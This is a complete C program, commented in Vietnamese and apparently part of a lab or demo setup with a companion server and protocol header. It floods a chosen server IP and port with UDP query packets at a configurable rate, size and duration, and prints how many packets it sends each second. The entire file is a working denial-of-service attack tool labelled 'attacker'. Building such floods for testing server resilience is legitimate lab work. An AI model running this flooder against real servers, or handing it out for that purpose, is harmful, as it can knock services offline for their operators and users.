// attacker: flood truy vấn UDP tới server với tốc độ cố định (gói/giây).
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "proto.h"

int main(int argc, char **argv)
{
    const char *server_ip = NULL;
    int port = QUERY_PORT;
    int rate = 5000;
    int size = 1000;
    int duration = 45;

    int opt;
    while ((opt = getopt(argc, argv, "s:p:r:l:d:")) != -1) {
        if (opt == 's') {
            server_ip = optarg;
        } else if (opt == 'p') {
            port = atoi(optarg);
        } else if (opt == 'r') {
            rate = atoi(optarg);
        } else if (opt == 'l') {
            size = atoi(optarg);
        } else if (opt == 'd') {
            duration = atoi(optarg);
        } else {
            server_ip = NULL;
            break;
        }
    }
    if (server_ip == NULL || rate <= 0 || duration <= 0 || size < 32 || size > 1400) {
        fprintf(stderr, "Cách dùng: %s -s <server_ip> [-p 9000] [-r 5000] [-l 1000 (32..1400)] [-d 45]\n", argv[0]);
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, server_ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "IP server không hợp lệ: %s\n", server_ip);
        return 1;
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0 || connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("socket/connect");
        return 1;
    }

    char pkt[1400];
    memset(pkt, 'x', sizeof(pkt));

    printf("[attacker] flood %s:%d, %d gói/s × %d byte, trong %d giây\n",
           server_ip, port, rate, size, duration);
    fflush(stdout);

    uint64_t start = now_us();
    uint64_t end = start + (uint64_t)duration * 1000000ULL;
    uint64_t next_tick = start + 1000000;
    uint64_t total = 0;
    uint64_t sent_this_second = 0;
    uint32_t seq = 0;
    int t = 0;
    struct timespec one_ms = { .tv_sec = 0, .tv_nsec = 1000000 };

    while (true) {
        uint64_t now = now_us();
        if (now >= end) {
            break;
        }

        // Gửi bù cho đủ số gói đáng lẽ phải gửi tới thời điểm này.
        uint64_t target = (now - start) * (uint64_t)rate / 1000000ULL;
        while (total < target) {
            seq++;
            int head = proto_format(pkt, sizeof(pkt), 'Q', seq, 0);
            if (head > 0) {
                pkt[head] = ' ';   // ghi đè '\0' để phần đệm 'x' nối liền phía sau
            }
            send(fd, pkt, (size_t)size, 0);
            total++;
            sent_this_second++;
        }

        if (now >= next_tick) {
            t++;
            printf("[attacker] t=%2d đã gửi %llu gói\n", t, (unsigned long long)sent_this_second);
            fflush(stdout);
            sent_this_second = 0;
            next_tick += 1000000;
        }

        nanosleep(&one_ms, NULL);
    }

    printf("[attacker] xong, tổng %llu gói\n", (unsigned long long)total);
    return 0;
}
